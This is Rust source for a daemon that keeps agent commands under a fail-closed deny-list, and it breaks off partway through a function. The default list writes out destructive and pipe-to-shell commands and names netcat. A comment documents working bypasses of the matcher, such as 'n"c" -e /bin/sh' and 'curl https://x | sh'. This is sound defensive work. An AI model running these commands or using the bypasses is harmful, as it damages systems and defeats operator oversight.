//! Cut F — trust / operability (daemon-native).
//!
//! M. Guardrails: a real command + executable deny-list enforced AT the scoped-exec primitive (the
//!    only path agent/shell commands run through), so an agent cannot bypass policy via ordinary
//!    shell — `bash -c "rm -rf /"` is still the command string the deny-list matches. Fail-closed +
//!    audited. (Executable content-hash veto in-guest is the microVM provider follow-on.)
//! N. Observability/recovery: expose the persisted per-env logs, aggregate operability metrics from
//!    real env/incident truth, and reconstruct an incident from receipts+attempts+logs+audit (the
//!    recovery CHAIN itself already lives in environment_routes::recover_environment).
//! O. Parity — Hypervisor MCP Gateway: scoped tools (hv_create_env / hv_run_task / hv_inspect_env /
//!    hv_cleanup_env) for external agents, each calling the SAME daemon routes the app uses, under
//!    the same guardrails — create → run → inspect → clean up through scoped contracts.
use std::path::Path;
use std::sync::Arc;

use axum::body::Bytes;
use axum::extract::{Path as AxumPath, Query, State};
use axum::http::{HeaderMap, StatusCode};
use axum::Json;
use serde_json::{json, Value};

use super::durable_fs::{self, PersistFailure};
use super::{iso_now, read_record_dir, AppError, DaemonState};

fn safe(seg: &str) -> String {
    seg.replace(
        |c: char| !c.is_ascii_alphanumeric() && c != '-' && c != '_',
        "_",
    )
}
fn nanos() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0)
}

// ============================ M. GUARDRAILS ======================================================
//
// THE COMMAND-EXECUTION GUARDRAIL POLICY. Canonical owner:
// `docs/architecture/components/daemon-runtime/platform-operability.md` — PO-10/PO-11/PO-12 and
// its "Command-execution guardrail policy" section own what a policy MEANS, how it COMPOSES, and
// what each failure state must DO. This module implements that contract over the daemon's local
// files. The AUTHORITY plane owns who may mutate it (resolved here through the existing
// organization-administrator crossing, never invented locally), and the scoped execution
// primitive in `environment_routes::handle_workspace_exec` is the final enforcement point.
//
// The whole shape of this section is three states that must never present identically (PO-11):
// policy ABSENT, policy OPERATOR-SET, policy INDETERMINATE. Substituting the conservative
// built-in default for a policy that cannot be READ answers "what did the operator require?"
// with a guess, so an unreadable or malformed store denies command execution instead.
//
// NOT owned or claimed here, per that same section: a registered wire contract, schema ref, or
// policy URI for `CommandExecutionGuardrailPolicy`; a stable public code vocabulary; a
// content-hash or in-guest executable veto; and any custody of this policy outside the daemon's
// local files. This is a daemon-local closure only.

/// The durable daemon-local family + record id an operator-set policy is written to. Both are
/// fixed literals rather than anything request-derived, so `persist_record_durable`'s
/// single-component family guard and filesystem-safe id guard can never be reached by input.
const POLICY_FAMILY: &str = "guardrail-policies";
const POLICY_RECORD: &str = "global";
/// The pre-durable-family spelling, a plain file at the data-dir root. READ-ONLY compatibility:
/// a valid legacy file remains the ACTIVE operator-set policy until the next successful POST
/// writes the durable record. The read path never deletes, rewrites, or migrates it — a read is
/// not a governed change.
const LEGACY_POLICY_FILE: &str = "guardrail-policy.json";
/// The only two keys a policy carries. There is no allow-list, exemption, or escape hatch on
/// either the global or the environment-local side; an environment able to exempt itself would
/// be authoring its own authority.
const DENIAL_KEYS: [&str; 2] = ["deny_commands", "deny_executables"];

/// The named conservative built-in default — what stands in for an ABSENT policy. It is NOT a
/// floor beneath an authorized one: an owner who durably sets a different policy has made a
/// governed change, and these lists do not silently re-add themselves underneath it.
///
/// PINNED. These exact 15 command patterns and 4 executables are the shipped enforcement table,
/// and this change alters neither their membership nor their matcher semantics — see
/// `match_denial`. The array LENGTHS are part of the type, so adding or removing an entry is a
/// compile error rather than a silent edit, and `default_matcher_table_is_pinned` asserts the
/// exact contents and order.
const DEFAULT_DENY_COMMANDS: [&str; 15] = [
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    ":(){",
    "mkfs",
    "dd if=",
    "> /dev/sd",
    "chmod -R 777 /",
    "shutdown",
    "reboot",
    "curl | sh",
    "wget | sh",
    "| sh -",
    "/etc/shadow",
    "/etc/passwd",
];
const DEFAULT_DENY_EXECUTABLES: [&str; 4] = ["nc", "ncat", "nmap", "telnet"];

fn default_policy() -> Value {
    json!({
        "deny_commands": DEFAULT_DENY_COMMANDS,
        "deny_executables": DEFAULT_DENY_EXECUTABLES,
        // Corrected prose: composition NARROWS ONLY (PO-10). A per-env `spec.guardrails`
        // declaration may ADD denials; it can never remove, relax, or override one, and the
        // previous "extends/overrides" wording asserted an authority no environment has.
        "note": "default fail-closed deny-list, active only while no operator-set policy is persisted; per-env spec.guardrails may ADD denials and may never remove or override one"
    })
}

fn json_kind(value: &Value) -> &'static str {
    match value {
        Value::Null => "null",
        Value::Bool(_) => "a boolean",
        Value::Number(_) => "a number",
        Value::String(_) => "a string",
        Value::Array(_) => "an array",
        Value::Object(_) => "an object",
    }
}

/// What produced the active global policy.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum PolicySource {
    BuiltInDefault,
    DurableOperatorRecord,
    LegacyOperatorFile,
}

impl PolicySource {
    fn code(self) -> &'static str {
        match self {
            PolicySource::BuiltInDefault => "built_in_default",
            PolicySource::DurableOperatorRecord => "durable_operator_record",
            PolicySource::LegacyOperatorFile => "legacy_operator_file",
        }
    }
    fn posture(self) -> &'static str {
        match self {
            PolicySource::BuiltInDefault => "ABSENCE: no operator-set policy is persisted in either store, so the named conservative built-in default is the active global policy. It stands in for an absent policy and is not a floor beneath an authorized one.",
            PolicySource::DurableOperatorRecord => "OPERATOR-SET: a policy is durably persisted in the daemon-local guardrail-policies/global record and is the active global policy.",
            PolicySource::LegacyOperatorFile => "OPERATOR-SET (LEGACY STORE): no durable record exists and the pre-durable-family guardrail-policy.json at the data-dir root is the active operator-set policy. The next successful policy write moves it into the durable record; this read path does not rewrite, migrate, or delete it.",
        }
    }
}

/// The resolved active global policy.
pub(crate) struct ActivePolicy {
    /// Exactly what GET reports as `policy`: the persisted record as projected, never a merge of
    /// persisted state with the built-in default.
    projection: Value,
    deny_commands: Vec<String>,
    deny_executables: Vec<String>,
    source: PolicySource,
    /// Denial keys ABSENT from a legacy operator file and normalized to an EMPTY base for
    /// composition, so an environment's own additions still land (PO-10 monotonicity) instead of
    /// being dropped because the merge target did not exist. Never populated for a durable
    /// record — every durable record is written complete — so an explicitly default-filled field
    /// stays distinguishable from a legacy absent one.
    normalized_absent_keys: Vec<&'static str>,
}

impl ActivePolicy {
    fn as_success(&self) -> Value {
        json!({
            "ok": true,
            "policy": self.projection,
            "source": self.source.code(),
            "posture": self.source.posture(),
            "normalized_absent_denial_keys": self.normalized_absent_keys,
            "normalized_absent_denial_keys_note": "LEGACY STORE ONLY. Denial keys absent from a pre-durable-family guardrail-policy.json, composed as an EMPTY base so environment-local additions still land; the built-in list is NOT re-added underneath an authorized change. This can never be non-empty for a durable record: a policy write is a full replacement carrying both keys, so a durable record missing one is malformed rather than an operator choice."
        })
    }
}

/// A store state that is neither "absent" nor "readable": the operator's requirement cannot be
/// determined, so nothing may be substituted for it (PO-11).
pub(crate) struct PolicyIndeterminacy {
    store: &'static str,
    detail: String,
}

impl PolicyIndeterminacy {
    fn new(store: &'static str, detail: impl Into<String>) -> Self {
        PolicyIndeterminacy {
            store,
            detail: detail.into(),
        }
    }

    fn recovery(&self) -> &'static str {
        match self.store {
            "legacy_file" => "the pre-durable-family guardrail-policy.json is opened NO-FOLLOW, so only a true ENOENT is absence: a SYMLINKED policy file, a non-regular occupant, an unreadable file, or malformed JSON is indeterminate. The daemon data directory itself is resolved normally, exactly as the durable record's family directory is, so a symlink-mounted data directory is NOT affected. MIGRATION: replace a symlinked guardrail-policy.json with a regular file in place, or repair/remove it — or set a policy through POST /v1/hypervisor/guardrails, which writes the durable record the read path prefers and stops consulting the legacy file entirely.",
            "environment_local_declaration" => "this environment's durable record carries a spec.guardrails declaration that is not a valid local addition. Environment creation now REFUSES such a declaration, so this record predates that validation or was written out of band. There is NO route that updates spec.guardrails: recovery is to delete and recreate the environment with a valid declaration, or to repair the durable environment record out of band. A malformed declaration is never ignored, because ignoring it would silently drop the additions it was written to impose.",
            _ => "repair or remove the daemon-local guardrail-policies/global record so the durable store is either readable or truly ABSENT, then re-set the policy through POST /v1/hypervisor/guardrails. A malformed durable store does not fall back to the legacy file or to the built-in default: only true absence permits either.",
        }
    }

    fn as_error(&self) -> Value {
        json!({
            "code": "guardrail_policy_indeterminate",
            "store": self.store,
            "message": self.detail,
            "recovery": self.recovery()
        })
    }

    /// The enforcement-point shape. It carries `denied` because execution IS refused, and it
    /// deliberately carries NO `rule` and NO `matched`: no policy rule fired, the policy could
    /// not be resolved at all.
    fn as_refusal(&self) -> Value {
        let mut refusal = self.as_error();
        refusal["denied"] = json!(true);
        refusal["fail_closed"] = json!(true);
        refusal["policy_indeterminate"] = json!(true);
        refusal
    }
}

/// The members of one denial list, or why the value is not one. A non-array, a non-string member,
/// or an empty/whitespace-only member is refused rather than coerced: an empty pattern normalizes
/// to the empty string, which every command contains, so silently accepting one would turn a
/// typo into an undiagnosable deny-everything.
fn denial_members(value: &Value) -> Result<Vec<String>, String> {
    let Some(items) = value.as_array() else {
        return Err(format!("is {} rather than an array", json_kind(value)));
    };
    let mut members = Vec::with_capacity(items.len());
    for (index, item) in items.iter().enumerate() {
        let Some(text) = item.as_str() else {
            return Err(format!(
                "member {index} is {} rather than a string",
                json_kind(item)
            ));
        };
        if text.trim().is_empty() {
            return Err(format!("member {index} is empty or whitespace-only"));
        }
        members.push(text.to_string());
    }
    Ok(members)
}

/// One denial list out of a PERSISTED operator-set policy. An absent key is tolerated only from
/// the legacy store, where a policy predating this contract can legitimately lack one; a durable
/// record is written complete, so an absent key there is malformed rather than an operator choice.
fn persisted_list(
    record: &Value,
    key: &'static str,
    source: PolicySource,
    store: &'static str,
    absent: &mut Vec<&'static str>,
) -> Result<Vec<String>, PolicyIndeterminacy> {
    match record.get(key) {
        Some(value) => denial_members(value).map_err(|why| {
            PolicyIndeterminacy::new(store, format!("the persisted '{key}' {why}"))
        }),
        None if source == PolicySource::LegacyOperatorFile => {
            absent.push(key);
            Ok(Vec::new())
        }
        None => Err(PolicyIndeterminacy::new(
            store,
            format!("the durable policy record is missing '{key}'; every durable record is written complete, so an absent denial key there is malformed rather than an operator choice"),
        )),
    }
}

fn project_persisted_policy(
    record: Value,
    source: PolicySource,
    store: &'static str,
) -> Result<ActivePolicy, PolicyIndeterminacy> {
    if !record.is_object() {
        return Err(PolicyIndeterminacy::new(
            store,
            format!(
                "the persisted policy is {} rather than a JSON object",
                json_kind(&record)
            ),
        ));
    }
    let mut normalized_absent_keys = Vec::new();
    let deny_commands = persisted_list(
        &record,
        "deny_commands",
        source,
        store,
        &mut normalized_absent_keys,
    )?;
    let deny_executables = persisted_list(
        &record,
        "deny_executables",
        source,
        store,
        &mut normalized_absent_keys,
    )?;
    Ok(ActivePolicy {
        projection: record,
        deny_commands,
        deny_executables,
        source,
        normalized_absent_keys,
    })
}

/// STRICT read of the legacy file, through the shared durable-fs mechanics rather than
/// hand-rolled metadata checks: `read_slot_strict` returns absence ONLY on a true ENOENT — a
/// symlink, a FIFO, a directory, or any read error is an Err the caller must refuse on.
///
/// THE DATA DIRECTORY IS RESOLVED NORMALLY, matching the durable lane exactly. `open_dir_pinned`
/// passes `O_NOFOLLOW`, which constrains only the TERMINAL path component, so pinning `data_dir`
/// itself would reject a symlinked data directory (`ENOTDIR`) — while the durable lane's
/// `open_family_dir_pinned` opens `<data_dir>/guardrail-policies`, where `data_dir` is
/// non-terminal and is followed. That asymmetry bought no containment (anyone who can replace
/// `data_dir` with a symlink equally controls `data_dir/guardrail-policies`) and cost a hard
/// availability regression for symlink-mounted deployments — containers and atomic-swap release
/// directories — which are exactly the population still on the legacy store.
///
/// Appending `.` makes the terminal component a name that is never a symlink, so the parent path
/// is followed and the pin still proves the result is a directory. The no-follow guarantee that
/// is actually claimed — the legacy POLICY FILE is not a symlink, FIFO, or directory — is
/// enforced by `read_slot_strict` on the terminal `guardrail-policy.json` below, unchanged.
fn read_legacy_policy_strict(data_dir: &str) -> Result<Option<Value>, PolicyIndeterminacy> {
    const STORE: &str = "legacy_file";
    let dir = match durable_fs::open_dir_pinned(&Path::new(data_dir).join(".")) {
        Ok(dir) => dir,
        // The data directory does not exist at all: the legacy file is genuinely ABSENT.
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(error) => {
            return Err(PolicyIndeterminacy::new(
                STORE,
                format!("the daemon data directory could not be opened as a directory ({error}), so whether a legacy policy file exists cannot be determined"),
            ))
        }
    };
    match durable_fs::read_slot_strict(&dir, LEGACY_POLICY_FILE) {
        Ok(None) => Ok(None),
        Ok(Some((_file, bytes))) => serde_json::from_slice::<Value>(&bytes)
            .map(Some)
            .map_err(|error| {
                PolicyIndeterminacy::new(
                    STORE,
                    format!("'{LEGACY_POLICY_FILE}' is not valid JSON ({error})"),
                )
            }),
        Err(error) => Err(PolicyIndeterminacy::new(
            STORE,
            format!("'{LEGACY_POLICY_FILE}' is not safely readable ({error}); only a true ENOENT is absence"),
        )),
    }
}

/// Resolve the ACTIVE global policy. Read order is durable record, then legacy file, then the
/// built-in default — and only TRUE ABSENCE of the preceding store permits the next one. A
/// malformed or unreadable durable family/record is indeterminate and never falls through, or a
/// corrupt durable store would silently reactivate a superseded legacy policy.
pub(crate) fn resolve_active_policy(data_dir: &str) -> Result<ActivePolicy, PolicyIndeterminacy> {
    match durable_fs::read_record_durable(data_dir, POLICY_FAMILY, POLICY_RECORD) {
        Ok(Some(record)) => {
            return project_persisted_policy(
                record,
                PolicySource::DurableOperatorRecord,
                "durable_record",
            )
        }
        Err(detail) => return Err(PolicyIndeterminacy::new("durable_record", detail)),
        Ok(None) => {}
    }
    match read_legacy_policy_strict(data_dir)? {
        Some(record) => {
            project_persisted_policy(record, PolicySource::LegacyOperatorFile, "legacy_file")
        }
        None => Ok(ActivePolicy {
            projection: default_policy(),
            deny_commands: DEFAULT_DENY_COMMANDS
                .iter()
                .map(|s| s.to_string())
                .collect(),
            deny_executables: DEFAULT_DENY_EXECUTABLES
                .iter()
                .map(|s| s.to_string())
                .collect(),
            source: PolicySource::BuiltInDefault,
            normalized_absent_keys: Vec::new(),
        }),
    }
}

/// THE ONE semantic validator for an environment-local declaration, owned here because this
/// module owns policy semantics. Environment CREATION and the enforcement point both call it, so
/// a declaration that creation accepts is exactly a declaration the primitive can compose — the
/// two can never drift into a record that is admissible but unenforceable.
///
/// `Ok(None)` = no declaration (absent, or the JSON null that records written before this field
/// was retained can spell). `Ok(Some(..))` = a valid declaration. `Err` = why it is not one.
pub(crate) fn validate_environment_guardrail_declaration(
    env_spec: &Value,
) -> Result<Option<&serde_json::Map<String, Value>>, String> {
    let Some(local) = env_spec.get("guardrails").filter(|value| !value.is_null()) else {
        return Ok(None);
    };
    let Some(fields) = local.as_object() else {
        return Err(format!(
            "spec.guardrails is {} rather than a JSON object",
            json_kind(local)
        ));
    };
    if let Some(unknown) = fields
        .keys()
        .find(|key| !DENIAL_KEYS.contains(&key.as_str()))
    {
        return Err(format!("spec.guardrails carries '{unknown}', which is not a denial key; an environment-local declaration may only ADD deny_commands/deny_executables entries and carries no allow-list, exemption, or escape hatch"));
    }
    for key in DENIAL_KEYS {
        // A missing local key means no additions for that key — never an error.
        if let Some(value) = fields.get(key) {
            denial_members(value).map_err(|why| format!("spec.guardrails '{key}' {why}"))?;
        }
    }
    Ok(Some(fields))
}

/// PO-10: composition NARROWS, and never the other way. An environment-local declaration may ADD
/// unique denials and may never remove, relax, scope-except, or override one. A composition step
/// that silently DROPS an environment's additions — because a global key was absent or a merge
/// target did not exist — is a widening defect even when every input is well-formed, which is why
/// an absent global key composes an empty base here instead of skipping the merge.
///
/// A malformed local declaration is INDETERMINATE, never ignored: ignoring it would drop exactly
/// the additions it was written to impose. Environment creation now refuses such a declaration up
/// front, so reaching this arm means a record that predates that validation or was written out of
/// band — which is why the recovery text names deleting/recreating the environment rather than an
/// update route that does not exist.
fn compose_with_environment(
    active: &ActivePolicy,
    env: &Value,
) -> Result<(Vec<String>, Vec<String>), PolicyIndeterminacy> {
    const STORE: &str = "environment_local_declaration";
    let mut deny_commands = active.deny_commands.clone();
    let mut deny_executables = active.deny_executables.clone();
    let spec = env.get("spec").cloned().unwrap_or(Value::Null);
    let fields = match validate_environment_guardrail_declaration(&spec) {
        Ok(None) => return Ok((deny_commands, deny_executables)),
        Ok(Some(fields)) => fields.clone(),
        Err(why) => return Err(PolicyIndeterminacy::new(STORE, why)),
    };
    for (key, target) in [
        ("deny_commands", &mut deny_commands),
        ("deny_executables", &mut deny_executables),
    ] {
        let Some(value) = fields.get(key) else {
            continue;
        };
        // Already validated above; an unreadable member here would be a validator bug, and
        // treating it as "no additions" would silently widen, so it propagates as indeterminate.
        let additions = denial_members(value).map_err(|why| {
            PolicyIndeterminacy::new(STORE, format!("spec.guardrails '{key}' {why}"))
        })?;
        for addition in additions {
            if !target.contains(&addition) {
                target.push(addition);
            }
        }
    }
    Ok((deny_commands, deny_executables))
}

fn norm(s: &str) -> String {
    // collapse runs of whitespace so "rm    -rf  /" matches "rm -rf /".
    s.to_ascii_lowercase()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

/// The shipped matcher, PRESERVED VERBATIM. Denied patterns match case-INSENSITIVELY against the
/// whitespace-normalized full command string; denied executables match against each
/// whitespace/metachar-split token's basename. Wrapping in `bash -c "<denied>"` does not smuggle
/// a denied command past, because that is still this command string.
///
/// KNOWN MATCHER LIMITS. Every one is a REAL BYPASS, all four are pinned by test, and none is
/// closed here: moving the enforcement line inside a change about where the policy is STORED
/// would be exactly the silent semantics drift this contract exists to prevent.
///   * `deny_commands` is a plain SUBSTRING test over the normalized string, so the shipped
///     `curl | sh` pattern requires `curl` and `| sh` to be literally adjacent. The realistic
///     pipe-to-shell form `curl https://x | sh` is NOT denied by it — only the separate `| sh -`
///     pattern catches the URL-bearing variant, and only when the shell takes a trailing `-`.
///   * whitespace runs are collapsed, so `curl   |   sh` is denied while `curl|sh`, which has no
///     whitespace to collapse around the pipe, is not.
///   * `deny_executables` matching is CASE-SENSITIVE, so `nc -e` is denied and `NC -e` is not,
///     even though command-pattern matching over the same string is case-insensitive.
///   * the tokenizer splits on `"` and `'`, so SHELL QUOTING inside an executable name defeats
///     it: `n"c" -e /bin/sh` tokenizes to `n`, `c`, `-e`, `sh` — none of which is a denied
///     basename — and the shell still runs `nc`. An earlier version of this comment claimed
///     quoting could not smuggle an executable past; that was false and is corrected here.
fn match_denial(
    deny_commands: &[String],
    deny_executables: &[String],
    command: &str,
) -> Option<Value> {
    let cmd_n = norm(command);
    for pattern in deny_commands {
        if cmd_n.contains(&norm(pattern)) {
            return Some(
                json!({ "denied": true, "rule": "deny_command", "matched": pattern, "fail_closed": true }),
            );
        }
    }
    let denied: std::collections::HashSet<&str> =
        deny_executables.iter().map(String::as_str).collect();
    // tokenize on shell metacharacters + whitespace; check each token's basename.
    for tok in command.split(|c: char| c.is_whitespace() || "|;&<>()`\"'".contains(c)) {
        let base = tok.rsplit('/').next().unwrap_or(tok).trim();
        if !base.is_empty() && denied.contains(base) {
            return Some(
                json!({ "denied": true, "rule": "deny_executable", "matched": base, "fail_closed": true }),
            );
        }
    }
    None
}

/// The enforcement-point outcome. `Allowed` says only that no veto fired: passing the deny test
/// removes one refusal and creates NO execution authority, grant, lease, or isolation. The
/// primitive still requires every other gate it already had.
pub(crate) enum GuardrailDecision {
    Allowed,
    Denied(Value),
    Indeterminate(Value),
}

/// Check a command against the effective policy for this environment (fail-closed).
pub(crate) fn guardrail_check(data_dir: &str, env: &Value, command: &str) -> GuardrailDecision {
    let active = match resolve_active_policy(data_dir) {
        Ok(active) => active,
        Err(indeterminacy) => return GuardrailDecision::Indeterminate(indeterminacy.as_refusal()),
    };
    let (deny_commands, deny_executables) = match compose_with_environment(&active, env) {
        Ok(lists) => lists,
        Err(indeterminacy) => return GuardrailDecision::Indeterminate(indeterminacy.as_refusal()),
    };
    match match_denial(&deny_commands, &deny_executables, command) {
        Some(denial) => GuardrailDecision::Denied(denial),
        None => GuardrailDecision::Allowed,
    }
}

/// Commit one operability-audit record and REPORT its durability instead of discarding it.
///
/// The audit step sits after the boundary between *not yet true* and *already true*: the fact it
/// records has already happened. Its failure is therefore an audit-durability GAP on a real
/// event, never a rollback and never a reason to re-decide the event — so this returns a state
/// the caller reports SEPARATELY, and no lane here can produce `audited: true` over a failed or
/// unconfirmed write.
fn commit_audit_record(data_dir: &str, id: &str, record: &Value, fact: &str) -> Value {
    audit_durability(
        id,
        fact,
        durable_fs::persist_record_durable(data_dir, "operability-audit", id, record),
    )
}

/// The audit-outcome MAPPING, extracted from the write so both failure arms are directly testable
/// without the shared process-global durable-fs fault seam: a test constructs the exact
/// `PersistFailure` it wants and asserts the disposition this function produces.
fn audit_durability(id: &str, fact: &str, outcome: Result<(), PersistFailure>) -> Value {
    match outcome {
        Ok(()) => json!({ "audited": true, "state": "durable", "audit_id": id }),
        Err(PersistFailure::NotCommitted(error)) => json!({
            "audited": false,
            "state": "not_committed",
            "audit_id": id,
            "message": format!("{fact}, but its audit record was NOT committed ({error}) — the evidence is lost, the fact is not"),
            "recovery": "repair the operability-audit family so later records commit. This gap is an OBSERVABILITY loss only; it did not change what was enforced, and the missing record must not be reconstructed as though it had been written."
        }),
        Err(PersistFailure::RenamedDurabilityUnconfirmed(error)) => json!({
            "audited": false,
            "state": "durability_unconfirmed",
            "audit_id": id,
            "message": format!("{fact}, but its audit record is VISIBLE with UNCONFIRMED durability ({error}) — it may or may not survive a crash"),
            "recovery": "treat this audit record as possibly-absent after a restart. The enforced fact is unaffected; only the evidence is uncertain."
        }),
    }
}

/// Record a guardrail refusal to the operability audit trail and report whether that record is
/// durable. Enforcement is the fact; the record is evidence of the fact. Losing the evidence is a
/// named observability gap — never a reason to admit the command.
pub(crate) fn audit_guardrail_denial(
    data_dir: &str,
    env_id: &str,
    command: &str,
    denial: &Value,
) -> Value {
    let id = format!("gad_{:x}", nanos());
    let record = json!({
        "schema_version": "ioi.hypervisor.operability-audit.v1",
        "audit_id": id, "kind": "guardrail_denied", "environment_ref": env_id,
        "command": command, "denial": denial, "at": iso_now()
    });
    commit_audit_record(
        data_dir,
        &id,
        &record,
        "the command was REFUSED and did not run",
    )
}

/// `changed_by_principal_ref` is the SERVER-RESOLVED principal from the authority crossing that
/// admitted this mutation — never a request-carried field, which `validated_candidate_policy`
/// refuses outright. A `truth_mutation` audit record that cannot answer "who" is weak evidence
/// for a plane whose whole point is the authority crossing.
fn audit_policy_change(data_dir: &str, principal_ref: &str, policy: &Value) -> Value {
    let id = format!("pca_{:x}", nanos());
    let record = json!({
        "schema_version": "ioi.hypervisor.operability-audit.v1",
        "audit_id": id, "kind": "policy_changed", "policy": policy,
        "changed_by_principal_ref": principal_ref, "at": iso_now()
    });
    commit_audit_record(
        data_dir,
        &id,
        &record,
        "the policy change is DURABLE and the new policy is already deciding every command",
    )
}

/// The read projection, extracted from the Axum adapter so the absence / operator-set / legacy /
/// indeterminate lanes are all directly testable.
fn guardrail_policy_projection(data_dir: &str) -> (StatusCode, Value) {
    match resolve_active_policy(data_dir) {
        Ok(active) => (StatusCode::OK, active.as_success()),
        Err(indeterminacy) => (
            StatusCode::SERVICE_UNAVAILABLE,
            json!({ "ok": false, "error": indeterminacy.as_error() }),
        ),
    }
}

/// GET /v1/hypervisor/guardrails — the active global policy, or a typed non-success when the
/// persisted policy is indeterminate.
pub(crate) async fn handle_guardrails_get(
    State(st): State<Arc<DaemonState>>,
) -> (StatusCode, Json<Value>) {
    let (status, payload) = guardrail_policy_projection(&st.data_dir);
    (status, Json(payload))
}

fn bad_request(code: &'static str, message: String) -> (StatusCode, Value) {
    (
        StatusCode::BAD_REQUEST,
        json!({ "ok": false, "error": { "code": code, "message": message } }),
    )
}

/// Validate a submitted policy. A policy write is a FULL REPLACEMENT: the submitted object
/// carries both denial keys and nothing else, each an array of non-empty strings.
///
/// A partial submission is REFUSED rather than completed. Filling an omitted key from the
/// built-in default was the shipped behaviour and it is a silent-loss path: an operator holding a
/// durable policy with custom `deny_commands` who submits only `deny_executables` would have had
/// their command denials durably REPLACED by the built-in list. PO-10 is explicit that the
/// default "does not silently re-add itself underneath" an authorized change, and this route's
/// own indeterminacy recovery text tells operators to POST a policy — so the destructive path was
/// reachable from this contract's own advice. Filling from the CURRENTLY ACTIVE policy instead
/// would be a read-modify-write with no compare-and-swap, which loses a concurrent update just as
/// silently. Requiring both keys makes the caller state the whole policy it intends to be active.
fn validated_candidate_policy(submitted: &Value) -> Result<Value, (&'static str, String)> {
    let Some(fields) = submitted.as_object() else {
        return Err((
            "guardrail_policy_request_malformed",
            format!(
                "a submitted policy is a JSON object, not {}",
                json_kind(submitted)
            ),
        ));
    };
    if let Some(extra) = fields
        .keys()
        .find(|key| !DENIAL_KEYS.contains(&key.as_str()))
    {
        return Err((
            "guardrail_policy_request_closed",
            format!("request-carried field '{extra}' is not allowed; a submitted policy carries only deny_commands and deny_executables, and identity, authority, source, and timestamps are resolved server-side"),
        ));
    }
    let mut record = serde_json::Map::new();
    for key in DENIAL_KEYS {
        let Some(value) = fields.get(key) else {
            return Err((
                "guardrail_policy_request_incomplete",
                format!("submitted policy is missing '{key}'; a policy write is a FULL REPLACEMENT and must carry both deny_commands and deny_executables. Nothing was written, and the currently active policy is unchanged — send the complete policy you intend to be active, reading GET /v1/hypervisor/guardrails first if you mean to preserve the other list."),
            ));
        };
        denial_members(value).map_err(|why| {
            (
                "guardrail_policy_request_malformed",
                format!("submitted '{key}' {why}"),
            )
        })?;
        record.insert(key.to_string(), value.clone());
    }
    record.insert("updated_at".to_string(), json!(iso_now()));
    Ok(Value::Object(record))
}

/// A FRESH read of whatever is active right now. Deliberately NOT labelled "the prior policy":
/// a refusal proves only that THIS candidate did not commit, never that the state this request
/// read a moment earlier survived a concurrent writer.
fn freshly_read_projection(data_dir: &str) -> Value {
    let mut projection = match resolve_active_policy(data_dir) {
        Ok(active) => json!({
            "source": active.source.code(),
            "policy": active.projection,
            "normalized_absent_denial_keys": active.normalized_absent_keys
        }),
        Err(indeterminacy) => json!({ "error": indeterminacy.as_error() }),
    };
    projection["read"] = json!(
        "read fresh AFTER this request's outcome; not a claim that this is the state the request read, and not a claim that any earlier state survived a concurrent writer"
    );
    projection
}

/// The persist-outcome mapping, extracted so BOTH lanes are directly testable without the shared
/// process-global durable-fs fault seam: a test constructs the exact `PersistFailure` it wants.
///
/// NEITHER lane audits. Canon puts the audit step strictly after `reload` because that is the
/// boundary between *not yet true* and *already true*; an unapplied or unconfirmed candidate is
/// not an already-happened fact, and auditing one would record a change that may never have
/// occurred.
fn refusal_for_persist_failure(data_dir: &str, failure: &PersistFailure) -> (StatusCode, Value) {
    match failure {
        PersistFailure::NotCommitted(error) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            json!({ "ok": false, "error": {
                "code": "guardrail_policy_persistence_failed",
                "message": format!("the submitted command-execution guardrail policy was NOT committed ({error}); it is not active, it was not audited, and nothing was truncated, emptied, or partially overwritten"),
                "recovery": "re-submit the policy. The projection beside this error is a fresh read taken AFTER the refusal, not an assertion about what this request originally read."
            }, "active_policy": freshly_read_projection(data_dir) }),
        ),
        PersistFailure::RenamedDurabilityUnconfirmed(error) => (
            StatusCode::SERVICE_UNAVAILABLE,
            json!({ "ok": false, "error": {
                "code": "guardrail_policy_durability_unconfirmed",
                "message": format!("the submitted policy ALREADY replaced the durable record in the live view and only the durability barrier failed ({error}), so the candidate is VISIBLE but may or may not survive a crash. This is NOT an atomic failure and NOT a claim that any prior policy is still active."),
                "recovery": "re-submit the identical policy to converge on a known durable state. Until it is confirmed, treat the effective policy as either the candidate or the state that preceded it."
            }, "observed_policy": freshly_read_projection(data_dir) }),
        ),
    }
}

/// The reload → audit half of canon's mutation order, extracted so the disagreement lane is
/// directly testable: a caller passes a candidate the durable store does not hold, which is
/// exactly what a concurrent writer produces.
fn acknowledge_policy_from_reload(
    data_dir: &str,
    principal_ref: &str,
    candidate: &Value,
) -> (StatusCode, Value) {
    let active = match resolve_active_policy(data_dir) {
        Ok(active) => active,
        Err(indeterminacy) => {
            return (
                StatusCode::SERVICE_UNAVAILABLE,
                json!({ "ok": false, "error": {
                    "code": "guardrail_policy_reload_indeterminate",
                    "message": "the write reported committed, but re-reading the policy store did not project a policy, so the submitted candidate is NOT acknowledged as the active policy",
                    "store_error": indeterminacy.as_error(),
                    "recovery": "resolve the store indeterminacy and re-submit. Command execution is denied while the policy is indeterminate."
                }}),
            );
        }
    };
    // Acknowledge the RELOADED durable projection or acknowledge nothing. The submitted candidate
    // is never the acknowledged policy.
    //
    // The comparison is over the WHOLE server-generated candidate record, not just the denial
    // lists. Denial-list equality alone would let this request acknowledge — and AUDIT under ITS
    // principal — a record a different concurrent writer committed, whenever the two happened to
    // submit equivalent lists. Attributing someone else's write to this caller is precisely the
    // false claim the audit record exists to prevent, so the mutation identity has to be the
    // record this request built, timestamp included.
    let agrees =
        active.source == PolicySource::DurableOperatorRecord && active.projection == *candidate;
    if !agrees {
        return (
            StatusCode::SERVICE_UNAVAILABLE,
            json!({ "ok": false, "error": {
                "code": "guardrail_policy_reload_disagreed",
                "message": "the write reported committed but the reloaded durable record is not the exact record this request built — a concurrent writer, or a store that does not read back what it accepted. The candidate is NOT acknowledged as active and the change was NOT audited, because acknowledging here would attribute another writer's policy to this caller.",
                "recovery": "re-read GET /v1/hypervisor/guardrails and re-submit if the active policy is still not the one intended."
            }, "active_policy": freshly_read_projection(data_dir) }),
        );
    }
    // PAST THE BOUNDARY. The policy is durable, so it is enforcing: reporting the mutation as
    // failed from here would invite a retry of an already-applied change, or leave a caller
    // believing the prior policy still stands while the new one decides every command.
